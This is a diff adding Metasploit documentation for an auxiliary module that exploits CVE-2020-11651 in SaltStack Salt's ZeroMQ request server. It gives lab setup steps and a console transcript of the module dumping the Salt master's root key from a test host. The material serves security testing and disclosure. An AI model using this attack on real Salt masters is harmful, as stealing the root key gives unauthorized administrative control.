@@ -1,0 +1,91 @@
+## Vulnerable Application
+
+### Description
+
+This module exploits unauthenticated access to the `_prep_auth_info()`
+method in the SaltStack Salt master's ZeroMQ request server, for
+versions 2019.2.3 and earlier and 3000.1 and earlier, to disclose the
+root key used to authenticate administrative commands to the master.
+
+VMware vRealize Operations Manager versions 7.5.0 through 8.1.0 are
+known to be affected by the Salt vulnerabilities.
+
+Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as
+well as Vulhub's Docker image.
+
+### Setup
+
+Follow [SaltStack's instructions for
+Ubuntu](https://repo.saltstack.com/#ubuntu) and "pin to minor release"
+either version **2019.2.3** or **3000.1**.
+
+Alternatively, you may use [Vulhub's Docker
+image](https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11651)
+for ease of installation. Version **2019.2.3** will be used.
+
+## Verification Steps
+
+Follow [Setup](#setup) and [Scenarios](#scenarios).
+
+## Actions
+
+### Dump
+
+This dumps the Salt master's root key by sending the `_prep_auth_info()`
+method and extracting the key from the resulting serialized auth info.
+
+## Scenarios
+
+### SaltStack Salt 2019.2.3 on Ubuntu 18.04
+
+```
+msf5 > use auxiliary/gather/saltstack_salt_root_key
+msf5 auxiliary(gather/saltstack_salt_root_key) > options
+
+Module options (auxiliary/gather/saltstack_salt_root_key):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   4506             yes       The target port (TCP)
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   Dump  Dump root key from Salt master
+
+
+msf5 auxiliary(gather/saltstack_salt_root_key) > set rhosts 172.28.128.5
+rhosts => 172.28.128.5
+msf5 auxiliary(gather/saltstack_salt_root_key) > run
+[*] Running module against 172.28.128.5
+
+[*] 172.28.128.5:4506 - Connecting to ZeroMQ service at 172.28.128.5:4506
+[*] 172.28.128.5:4506 - Negotiating signature
+[+] 172.28.128.5:4506 - Received valid signature: "\xFF\x00\x00\x00\x00\x00\x00\x00\x01\x7F"
+[*] 172.28.128.5:4506 - Sending identical signature
+[*] 172.28.128.5:4506 - Negotiating version
+[+] 172.28.128.5:4506 - Received compatible version: "\x03"
+[*] 172.28.128.5:4506 - Sending identical version
+[*] 172.28.128.5:4506 - Negotiating NULL security mechanism
+[+] 172.28.128.5:4506 - Received NULL security mechanism
+[*] 172.28.128.5:4506 - Sending NULL security mechanism
+[*] 172.28.128.5:4506 - Sending READY command of type REQ
+[+] 172.28.128.5:4506 - Received READY reply of type ROUTER
+[*] 172.28.128.5:4506 - Yeeting _prep_auth_info() at 172.28.128.5:4506
+[+] 172.28.128.5:4506 - Received serialized auth info
+[+] 172.28.128.5:4506 - Root key: bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=
+[*] 172.28.128.5:4506 - Disconnecting from 172.28.128.5:4506
+[*] Auxiliary module execution completed
+msf5 auxiliary(gather/saltstack_salt_root_key) > creds
+Credentials
+===========
+
+host          origin        service                 public  private                                                                       realm  private_type  JtR Format
+----          ------        -------                 ------  -------                                                                       -----  ------------  ----------
+172.28.128.5  172.28.128.5  4506/tcp (salt/zeromq)  root    bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=         Password
+
+msf5 auxiliary(gather/saltstack_salt_root_key) >
+```
